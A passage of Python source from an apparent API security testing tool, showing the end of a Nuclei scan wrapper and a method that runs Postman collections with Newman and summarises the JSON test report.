                "total_findings": len(findings),
                "severity_summary": severity_count,
                "findings": findings[:50],
                "output_file": output_file,
                "timestamp": datetime.now().isoformat()
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Nuclei timed out"}
        except Exception as e:
            logger.error(f"Nuclei API scan error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== Newman/Postman Collection Runner ====================

    def newman_run(self, collection: str, environment: str = "",
                   globals_file: str = "", iterations: int = 1,
                   delay: int = 0, additional_args: str = "") -> Dict[str, Any]:
        """
        Run Postman collection with Newman.

        Args:
            collection: Path or URL to Postman collection JSON
            environment: Path to environment file
            globals_file: Path to globals file
            iterations: Number of iterations
            delay: Delay between requests (ms)
            additional_args: Additional Newman arguments

        Returns:
            Test results summary
        """
        try:
            report_dir = os.path.join(
                self.output_dir, "newman",
                f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            )
            os.makedirs(report_dir, exist_ok=True)

            # Check if Newman is installed
            try:
                subprocess.run(["newman", "--version"], capture_output=True, timeout=5)
            except FileNotFoundError:
                return {
                    "success": False,
                    "error": "Newman not found",
                    "install_command": "npm install -g newman"
                }

            cmd = [
                "newman", "run", collection,
                "--reporters", "json,cli",
                "--reporter-json-export", os.path.join(report_dir, "results.json"),
                "-n", str(iterations)
            ]

            if environment:
                cmd.extend(["-e", environment])

            if globals_file:
                cmd.extend(["-g", globals_file])

            if delay > 0:
                cmd.extend(["--delay-request", str(delay)])

            if additional_args:
                cmd.extend(additional_args.split())

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            # Parse results
            summary = {}
            report_file = os.path.join(report_dir, "results.json")
            if os.path.exists(report_file):
                with open(report_file, 'r') as f:
                    data = json.load(f)
                    run = data.get("run", {})
                    stats = run.get("stats", {})
                    summary = {
                        "iterations": stats.get("iterations", {}).get("total", 0),
                        "requests": stats.get("requests", {}).get("total", 0),
                        "tests": stats.get("tests", {}).get("total", 0),
                        "test_passed": stats.get("tests", {}).get("passed", 0),
                        "test_failed": stats.get("tests", {}).get("failed", 0),
                        "assertions": stats.get("assertions", {}).get("total", 0),
                        "assertions_failed": stats.get("assertions", {}).get("failed", 0)
                    }

                    # Get failures
                    failures = []
                    for execution in run.get("executions", []):
                        for assertion in execution.get("assertions", []):
                            if assertion.get("error"):
                                failures.append({
                                    "name": execution.get("item", {}).get("name", ""),
                                    "assertion": assertion.get("assertion", ""),
                                    "error": assertion.get("error", {}).get("message", "")
                                })
                    summary["failures"] = failures[:20]

            return {
                "success": result.returncode == 0,
                "collection": collection,
                "summary": summary,
                "report_dir": report_dir,
                "stdout": result.stdout[:5000] if result.stdout else "",
                "stderr": result.stderr[:2000] if result.returncode != 0 else "",
                "timestamp": datetime.now().isoformat()
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Newman timed out"}
        except Exception as e:
            logger.error(f"Newman error: {e}")
            return {"success": False, "error": str(e)}




# Create singleton instance
api_tester = APISecurityTester()
